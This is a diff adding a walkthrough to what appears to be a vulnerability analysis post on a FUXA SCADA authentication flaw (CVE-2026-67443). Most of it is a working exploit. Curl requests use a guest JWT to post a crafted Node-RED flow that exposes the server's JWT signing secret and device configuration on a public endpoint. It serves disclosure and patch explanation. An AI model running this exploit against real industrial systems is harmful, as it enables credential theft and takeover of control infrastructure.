@@ -235,5 +235,155 @@ endpoint?
 
 When PR #2660 was merged to protect `/nodered/*` endpoint, it reused function to verify the JWT signature as a way to check
 whether a request is allowed or not. However, since both admin and guest JWT were signed using the same secret code, both had
-the same valid signature. In other words, any valid JWT can be used to access `/nodered/*` endpoint regardless the groups. This
-is what [CVE-2026-67443](https://www.cve.org/CVERecord?id=CVE-2026-67443) is all about.
+the same valid signature. In other words, any valid JWT can be used to access `/nodered/*` endpoint regardless of the groups.
+This is what [CVE-2026-67443](https://www.cve.org/CVERecord?id=CVE-2026-67443) is all about.
+
+![](/images/analyzing-scada-software-cve/fuxa-authentication-flow.png "Figure 3. FUXA Node-RED Endpoint Authentication Flow")
+
+On Figure 3 we can see how the authentication flow works, it only checks whether the JWT signature is valid. Let's try getting
+the guest token first, make sure we test it on image `docker.io/frangoteam/fuxa:1.3.2`
+
+```
+> curl -iX POST localhost:1881/api/heartbeat
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Methods: GET,PUT,POST,DELETE,OPTIONS
+Access-Control-Allow-Headers: x-access-token, x-auth-user, Origin, Content-Type, Accept, Skip-Auth, Skip-Error
+X-RateLimit-Limit: 100
+X-RateLimit-Remaining: 99
+Date: Thu, 26 Nov 2026 07:27:46 GMT
+X-RateLimit-Reset: 1795678193
+Content-Type: application/json; charset=utf-8
+Content-Length: 201
+ETag: W/"c9-rTedMd3wY6J9lVjvQFBK6n0H/eM"
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"message":"guest","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Imd1ZXN0IiwiZ3JvdXBzIjpbImd1ZXN0Il0sImlhdCI6MTc5NTY3ODA2NiwiZXhwIjoxNzk1NjgxNjY2fQ.G8ziBvtqcKmoBm7-ajzvuZHI2FI1T3XVyE9O9rK6L24"}
+```
+
+If we decode the `token` we will get the following payload,
+
+```json
+{
+  "id": "guest",
+  "groups": [
+    "guest"
+  ],
+  "iat": 1795678066,
+  "exp": 1795681666
+}
+```
+
+Now the next step is we are going to use this to call `/nodered/flows` just like before, let's test it without payload.
+
+```
+> curl -iX POST 
+    -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Imd1ZXN0IiwiZ3JvdXBzIjpbImd1ZXN0Il0sImlhdCI6MTc5NTY3ODA2NiwiZXhwIjoxNzk1NjgxNjY2fQ.G8ziBvtqcKmoBm7-ajzvuZHI2FI1T3XVyE9O9rK6L24' 
+    localhost:1881/nodered/flows
+
+HTTP/1.1 400 Bad Request
+X-Powered-By: Express
+Access-Control-Allow-Methods: GET,PUT,POST,DELETE,OPTIONS
+Access-Control-Allow-Headers: x-access-token, x-auth-user, Origin, Content-Type, Accept, Skip-Auth, Skip-Error
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Content-Length: 72
+ETag: W/"48-GNgTwSgYngmuEUMiql32UdMZN34"
+Date: Thu, 26 Nov 2026 07:32:50 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"code":"unexpected_error","message":"config.forEach is not a function"}
+```
+
+Looks good, we got HTTP 400 instead of HTTP 401. Next is we are going to craft a payload. This time we are not just executing a code
+to write a new file but we are adding a new endpoint to retrieve credentials from the server. Here is the payload
+
+```json
+[
+  {
+    "id": "tab-leak",
+    "type": "tab",
+    "label": "leak"
+  },
+  {
+    "id": "in",
+    "type": "http in",
+    "z": "tab-leak",
+    "url": "/leak",
+    "method": "get",
+    "x": 140,
+    "y": 120,
+    "wires": [
+      [
+        "fn"
+      ]
+    ]
+  },
+  {
+    "id": "fn",
+    "type": "function",
+    "z": "tab-leak",
+    "name": "leak runtime",
+    "func": "const rt = global.get('fuxa').runtime;\nmsg.payload = {\n  secretCode: rt.settings.secretCode,\n  tokenExpiresIn: rt.settings.tokenExpiresIn,\n  devices: rt.project.getDevices()\n};\nreturn msg;",
+    "outputs": 1,
+    "x": 360,
+    "y": 120,
+    "wires": [
+      [
+        "out"
+      ]
+    ]
+  },
+  {
+    "id": "out",
+    "type": "http response",
+    "z": "tab-leak",
+    "x": 580,
+    "y": 120,
+    "wires": []
+  }
+]
+```
+
+What happen in the payload here is, we are adding a new entrypoint with `http in` to trigger a function. The entrypoint is
+located at `/leak` but in this case, FUXA will route it to `/dashboard/leak` which is a public endpoint. The function here
+will return a JSON payload that consist information like `secretCode` which is used to sign a JWT, `tokenExpiresIn` to tell
+how long the token expire and `devices` which list the configuration of connected devices. We send this payload to create a
+flow in Node-RED. Here is the response,
+
+```
+> curl -iX POST
+        -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Imd1ZXN0IiwiZ3JvdXBzIjpbImd1ZXN0Il0sImlhdCI6MTc5NTY3ODA2NiwiZXhwIjoxNzk1NjgxNjY2fQ.G8ziBvtqcKmoBm7-ajzvuZHI2FI1T3XVyE9O9rK6L24' 
+        --json @payload.json
+        localhost:1881/nodered/flows
+
+HTTP/1.1 204 No Content
+X-Powered-By: Express
+Access-Control-Allow-Methods: GET,PUT,POST,DELETE,OPTIONS
+Access-Control-Allow-Headers: x-access-token, x-auth-user, Origin, Content-Type, Accept, Skip-Auth, Skip-Error
+Access-Control-Allow-Origin: *
+Date: Thu, 26 Nov 2026 07:50:18 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+```
+
+There is no error, although we are using guest token it is accepting the payload. Now let's try call `/dashboard/leak`
+
+```
+> curl localhost:1881/dashboard/leak | python -m json -m json.tool
+
+{
+    "secretCode": "lab-only-secret",
+    "tokenExpiresIn": "1h",
+    "devices": {}
+}
+```
+
+There you go, we manage to steal the `secretCode` which is used by the server to sign a JWT. The `devices` here is empty
+since I don't connect to any devices. We can do many things with this vulnerability from RCE to create a webshell, this is
+why adding proper protection is necessary to this endpoint.
+
+This vulnerability is patched on [PR #2393](https://github.com/frangoteam/FUXA/pull/2393), it added validation by decoding
+the JWT and check if the group payload is 'guest' or 'admin'. It will return HTTP 403 if the group is 'guest'.
